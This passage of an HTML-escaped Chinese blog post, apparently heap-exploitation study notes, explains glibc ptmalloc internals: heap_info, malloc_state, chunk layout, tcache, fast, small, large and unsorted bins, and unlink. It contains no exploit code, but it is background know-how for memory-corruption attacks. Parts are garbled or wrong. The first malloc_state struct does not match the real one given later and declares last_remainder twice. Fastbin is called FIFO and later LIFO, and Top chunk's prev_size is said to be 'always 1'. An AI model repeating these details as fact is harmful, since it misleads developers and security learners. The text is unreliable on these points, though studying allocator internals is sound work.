  &lt;span class=&#34;token class-name&#34;&gt;size_t&lt;/span&gt; size&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;//当前heap_info结构所描述的堆内存大小&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; mmaped&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;//标记当前堆内存是否由mmap系统调用分配&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;heap_info&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;next&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;//指向后一个heap_info结构&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;arena&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;ar_ptr&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;//指向当前堆内存所在的arena&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;malloc-state&#34;&gt;&lt;a href=&#34;#malloc-state&#34; class=&#34;headerlink&#34; title=&#34;malloc_state&#34;&gt;&lt;/a&gt;malloc_state&lt;/h3&gt;&lt;p&gt;&lt;code&gt;malloc_state&lt;/code&gt; 用于表示 &lt;em&gt;arena&lt;/em&gt; 的信息，因此也被称为 &lt;em&gt;arena header&lt;/em&gt;，每个线程只含有一个 &lt;em&gt;arena header&lt;/em&gt;。&lt;em&gt;arena header&lt;/em&gt; 包含 &lt;em&gt;bin&lt;/em&gt;、&lt;em&gt;top chunk&lt;/em&gt; 以及 &lt;em&gt;last remainder chunk&lt;/em&gt; 等信息&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;malloc_state&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;token class-name&#34;&gt;binmap_t&lt;/span&gt;     binmap&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;BINMAPSIZE&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 用于标记哪些 bin 是非空的&lt;/span&gt;
  mfastbinptr  fastbinsY&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;NFASTBINS&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 用于存放小块内存的链表&lt;/span&gt;
  mchunkptr    top&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 指向当前 arena 中最后一个已分配的 chunk&lt;/span&gt;
  mchunkptr    last_remainder&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 指向上一个 arena 中未被使用完的 chunk&lt;/span&gt;
  mchunkptr    bins&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;NBINS &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 用于存放各个 bin 中的 chunk&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;malloc_state&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;next&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 指向下一个 malloc_state 结构&lt;/span&gt;
  &lt;span class=&#34;token class-name&#34;&gt;uint64_t&lt;/span&gt;     magic&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 用于检查 malloc_state 结构的完整性&lt;/span&gt;
  &lt;span class=&#34;token class-name&#34;&gt;uint64_t&lt;/span&gt;     flags&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 保存了 malloc_state 的各种状态信息&lt;/span&gt;
  &lt;span class=&#34;token class-name&#34;&gt;mutex_t&lt;/span&gt;      mutex&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 用于保护 malloc_state 结构的互斥锁&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;       seg&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 指向当前 arena 的起始地址&lt;/span&gt;
  &lt;span class=&#34;token class-name&#34;&gt;size_t&lt;/span&gt;       size&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 当前 arena 的大小&lt;/span&gt;
  &lt;span class=&#34;token class-name&#34;&gt;size_t&lt;/span&gt;       mprotect_size&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 当前 arena 中已经保护的内存大小&lt;/span&gt;
  mchunkptr    mprotect_base&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 当前 arena 中已经保护的内存的起始地址&lt;/span&gt;
  mchunkptr    last_remainder&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 上一个 arena 中未被使用完的 chunk&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;heap_info&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;heap_info&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 当前 arena 所在的 heap_info 结构&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;h3 id=&#34;chunk的组织形式&#34;&gt;&lt;a href=&#34;#chunk的组织形式&#34; class=&#34;headerlink&#34; title=&#34;chunk的组织形式&#34;&gt;&lt;/a&gt;chunk的组织形式&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;malloc_chunk&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;token comment&#34;&gt;/* #define INTERNAL_SIZE_T size_t */&lt;/span&gt;
  INTERNAL_SIZE_T      prev_size&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;/* 记录前一个chunk的大小，如果前一个chunk是free状态，此字段依然有用 ,而且该size的计算并不不包含前一个chunk的chunk头*/&lt;/span&gt;
  INTERNAL_SIZE_T      size&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;       &lt;span class=&#34;token comment&#34;&gt;/* 指向在bin中时前一个chunk和后一个chunk的位置，因此只有空闲状态的chunk使用 */&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;malloc_chunk&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; fd&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;    
  &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;malloc_chunk&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; bk&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;token comment&#34;&gt;/* 上下这两个指针占用相同的空间 区别在于当前chunk是free的时候*/&lt;/span&gt;
  &lt;span class=&#34;token comment&#34;&gt;/* Only used for large blocks: pointer to next larger size.  */&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;malloc_chunk&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; fd_nextsize&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* double links -- used only if free. */&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;malloc_chunk&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; bk_nextsize&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;ul&gt;
&lt;li&gt;chunk在32位下的8字节对齐，在64位下的16字节对齐，因此allocater返回的chunk要比实际需要的稍大一些&lt;/li&gt;
&lt;li&gt;基本的chunk分配策略是首先在先前释放的chunk中找到合适的，如果没有择取heap区域的chunk&lt;/li&gt;
&lt;li&gt;如果上面的方法均不成功，则会去要求系统新分配一块内存mmap方法&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;已分配chunk的数据结构情况&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/HEAP-EXP-heap-management.assets/image-20230613234305496.png&#34; alt=&#34;image-20230613234305496&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;未分配的chunk数据结构情况&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/HEAP-EXP-heap-management.assets/image-20230613234401273.png&#34; alt=&#34;image-20230613234401273&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	在上面能够很明显的看到chunk在使用状态下原本存放fd和bk的位置会被直接用来存放用户数据。用户在使用malloc时返回的内存指针是指向chunk头后面的部分，在free后指向的fd的存放位置。&lt;/p&gt;
&lt;p&gt;​	这里的p是标志前一个chunk（地址更小的）是否处于被使用的状态，如果是则置位1，且prev_size有效（标志相邻的堆块大小，这里是指物理上相邻，主要用于进行内存块的合并操作，&lt;strong&gt;且prev_size的大小指的是包含当前块头部和用户数据的部分&lt;/strong&gt;）&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;N：是不是「主分配区」分配的内存 1 表示不是主分配区分配的，0 表示是主分配区分配的

M：是不是 Memory Mapped 分配的内存，1 表示是，0 表示是 heap

P：表示前一个 chunk 是否在使用，在初始化的时候通常为 1，防止使用不能访问的内存&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzE3MTI2MS5odG1s&#34;&gt;https://www.freebuf.com/articles/system/171261.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JyZWV6ZV9DQVQvYXJ0aWNsZS9kZXRhaWxzLzEwMzc4ODY5OA==&#34;&gt;https://blog.csdn.net/Breeze_CAT/article/details/103788698&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;tcache（thread-local-caching）机制&#34;&gt;&lt;a href=&#34;#tcache（thread-local-caching）机制&#34; class=&#34;headerlink&#34; title=&#34;tcache（thread local caching）机制&#34;&gt;&lt;/a&gt;tcache（thread local caching）机制&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;tcache&lt;/code&gt;属于一种缓存机制，它为每一个线程创建了一个缓存，从而实现了不加锁的堆块分配算法，起到了性能提升的作用。&lt;/li&gt;
&lt;li&gt;仅适用于glibc2.26以上的版本使用&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;Bin机制&#34;&gt;&lt;a href=&#34;#Bin机制&#34; class=&#34;headerlink&#34; title=&#34;Bin机制&#34;&gt;&lt;/a&gt;Bin机制&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;ptmalloc 一共维护128个bin，使用数组存储链表头，&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;fast bin&lt;/strong&gt;：fastbin是一些要被系统回收的较小的内存块，此类内存块使用一个&lt;strong&gt;单向链表&lt;/strong&gt;进行存储，该bin中的所有chunk都不会被合并。内存分配时会先在fastbins中进行查找，随后才会在其他bin中进行查找。（chunksize &amp;lt; maxsize时才会被放在fastbin中）采用先进先出标准进行管理。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;small bin&lt;/strong&gt;：专门存放size&amp;lt;512的chunk，使用双向链表进行存储（也就是之前所说的拉链法存储），数组中的每个元素是chunk链的头，只有相同大小的bin能被存在一个链里，每个链之间相差8byte。共有62个循环双向链表。small bin与fast bin的某些大小是重合的，因此有些可以放入fastbin的块也可以在smallbin&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;large bin&lt;/strong&gt;：需要对bin中的chunk按照大小进行排序。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;unsorted bin&lt;/strong&gt;：可以将其视为一个bin在回归其正确的所属bin之前的一个缓存，在释放一个不符合fast bin要求的chunk时会被先放入到unsorted bin中进行存储，同理，在进行chunk的切割后，剩余的某个部分是不合fast bin要求的则会将其放入unsorted bin中进行存储。与一般的bin不同之处在于，unsorted bin其本身只有一个。&lt;ul&gt;
&lt;li&gt;当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。&lt;/li&gt;
&lt;li&gt;释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。&lt;/li&gt;
&lt;li&gt;fastchunk中的某些bin合并后大于fast bin的要求，那就先放入usorted bin等待后续的处理。&lt;/li&gt;
&lt;li&gt;unsorted bin在使用的过程中是FIFO的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Top Chunk&lt;/strong&gt;：Topchunk其实是在用户进行首次malloc时使用的内存，一部分给用户，一部分留给了Topchunk，当所有的bin都没有符合所需大小的时候，才会去动Top chunk，Top chunk的prevsize永远为1，否则前面的chunk就会被合并到Top Chunk中（也就是说链表中的前一个chunk始终不会被合并到top chunk中去），其实根据上面的过程不难发现，&lt;strong&gt;初始状态下的UNsorted chunk 就是 Top chunk&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;last reminder：其实就是经过malloc分配后切割出来的一块，这一块会放进unsorted bin中。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;Bin运作流程&#34;&gt;&lt;a href=&#34;#Bin运作流程&#34; class=&#34;headerlink&#34; title=&#34;Bin运作流程&#34;&gt;&lt;/a&gt;Bin运作流程&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;如果被用户释放的chunk大于max_fast，或者fast bins中的空闲chunk合并后，这些chunk首先会被放到unsorted bin队列中&lt;/li&gt;
&lt;li&gt;在进行malloc操作的时候，如果在fast bins中没有找到合适的chunk，则ptmalloc会先在unsorted bin中查找合适的空闲chunk，然后才查找bins。&lt;/li&gt;
&lt;li&gt;如果unsorted bin不能满足分配要求。malloc便会将unsorted bin中的chunk加入bins中。然后再从bins中继续进行查找和分配过程。&lt;/li&gt;
&lt;li&gt;unsorted bin可以看做是bins的一个缓冲区，增加它只是为了加快分配的速度。&lt;/li&gt;
&lt;li&gt;在size&amp;gt;FASTBIM_CONNSOLIDATION_THRESHOLD,时(需要大chunk时)，ptmalloc会遍历fast bins中的chunk，将相邻的空闲chunk进行合并，并将合并后的chunk加入unsorted bin中，然后再将usorted bin里的chunk加入bins中。&lt;br&gt;Unsorted Bin&lt;/li&gt;
&lt;li&gt;空闲的chunk连入bin时,会将 P 设为 0 , 并检查前后chunk是否空闲,若空闲则合并后加入unsorted bins中&lt;/li&gt;
&lt;li&gt;当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。&lt;/li&gt;
&lt;li&gt;释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。&lt;/li&gt;
&lt;li&gt;当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话&lt;/li&gt;
&lt;li&gt;分配过程：fastbin-&amp;gt;unsorted bin-&amp;gt;其他bins-&amp;gt;切割top chunk&lt;/li&gt;
&lt;li&gt;回收过程：&lt;ul&gt;
&lt;li&gt;在maped区域，直接回收即可&lt;/li&gt;
&lt;li&gt;在heap区域：首先检查当前堆块是否符合fastbin的要求，如果不符合就将其先放入到unsorted bin中等待后续的处理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;各个bin的处理先后顺序&#34;&gt;&lt;a href=&#34;#各个bin的处理先后顺序&#34; class=&#34;headerlink&#34; title=&#34;各个bin的处理先后顺序&#34;&gt;&lt;/a&gt;各个bin的处理先后顺序&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;fastbin 是 LIFO (后入先出)&lt;/li&gt;
&lt;li&gt;unsorted bin是 FIFO (先进先出)&lt;/li&gt;
&lt;li&gt;small bin 是 FIFO&lt;/li&gt;
&lt;li&gt;large bin 是 FIFO&lt;/li&gt;
&lt;li&gt;tcache 是 LIFO&lt;/li&gt;
&lt;li&gt;实际利用时只要知道fastbin为了加快速度学习了栈的机制&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;线程堆&#34;&gt;&lt;a href=&#34;#线程堆&#34; class=&#34;headerlink&#34; title=&#34;线程堆&#34;&gt;&lt;/a&gt;线程堆&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;每个线程在创建之初是会先申请一大块堆，使用heap_info结构对其进行记录，所有的heap通过单链表进行连接。一个线程可以有多个堆（其实就是初始分配的不够用），由于线程只能使用mmap，后续的堆要使用pre指针将heap_info进行连接。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;malloc-state-1&#34;&gt;&lt;a href=&#34;#malloc-state-1&#34; class=&#34;headerlink&#34; title=&#34;malloc_state&#34;&gt;&lt;/a&gt;malloc_state&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;该结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲 chunk，有什么大小的空闲 chunk 等等。&lt;/li&gt;
&lt;li&gt;无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;malloc_state&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;/* Serialize access.  */&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;__libc_lock_define&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; mutex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;token comment&#34;&gt;/* Flags (formerly in max_fast).  */&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; flags&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;token comment&#34;&gt;/* Fastbins */&lt;/span&gt;
    mfastbinptr fastbinsY&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt; NFASTBINS &lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;token comment&#34;&gt;/* Base of the topmost chunk -- not otherwise kept in a bin */&lt;/span&gt;
    mchunkptr top&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;token comment&#34;&gt;/* The remainder from the most recent split of a small request */&lt;/span&gt;
    mchunkptr last_remainder&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;token comment&#34;&gt;/* Normal bins packed as described above */&lt;/span&gt;
    mchunkptr bins&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt; NBINS &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;token comment&#34;&gt;/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; binmap&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt; BINMAPSIZE &lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;token comment&#34;&gt;/* Linked list, points to the next arena */&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;malloc_state&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;next&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;token comment&#34;&gt;/* Linked list for free arenas.  Access to this field is serialized
       by free_list_lock in arena.c.  */&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;malloc_state&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;next_free&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;token comment&#34;&gt;/* Number of threads attached to this arena.  0 if the arena is on
       the free list.  Access to this field is serialized by
       free_list_lock in arena.c.  */&lt;/span&gt;
    INTERNAL_SIZE_T attached_threads&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;token comment&#34;&gt;/* Memory allocated from the system in this arena.  */&lt;/span&gt;
    INTERNAL_SIZE_T system_mem&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    INTERNAL_SIZE_T max_system_mem&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;















&lt;h2 id=&#34;堆管理函数&#34;&gt;&lt;a href=&#34;#堆管理函数&#34; class=&#34;headerlink&#34; title=&#34;堆管理函数&#34;&gt;&lt;/a&gt;堆管理函数&lt;/h2&gt;&lt;h3 id=&#34;libc-malloc&#34;&gt;&lt;a href=&#34;#libc-malloc&#34; class=&#34;headerlink&#34; title=&#34;libc_malloc&#34;&gt;&lt;/a&gt;libc_malloc&lt;/h3&gt;&lt;p&gt;​	malloc函数的本质是libc_malloc, 该函数其实也是对_int_malloc函数做一个封装操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;用户申请的字节一旦进入libc_malloc会转换为无符号整数&lt;/strong&gt;，同时在源码中能看到其中包含一个对于malloc_hook函数指针的调用，是便于用于进行自定义的malloc函数的编写。&lt;/p&gt;
&lt;h3 id=&#34;unlink&#34;&gt;&lt;a href=&#34;#unlink&#34; class=&#34;headerlink&#34; title=&#34;unlink&#34;&gt;&lt;/a&gt;unlink&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;作用：将一个chunk从双向链表中取出来，其实就是解链操作，因此该函数的使用十分频繁。&lt;/li&gt;
&lt;li&gt;使用场景：&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;malloc&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;从恰好大小合适的 large bin 中获取 chunk。&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;这里需要注意的是 fastbin 与 small bin 就没有使用 unlink，这就是为什么漏洞会经常出现在它们这里的原因。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;依次遍历处理 unsorted bin 时也没有使用 unlink&lt;/strong&gt; 。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
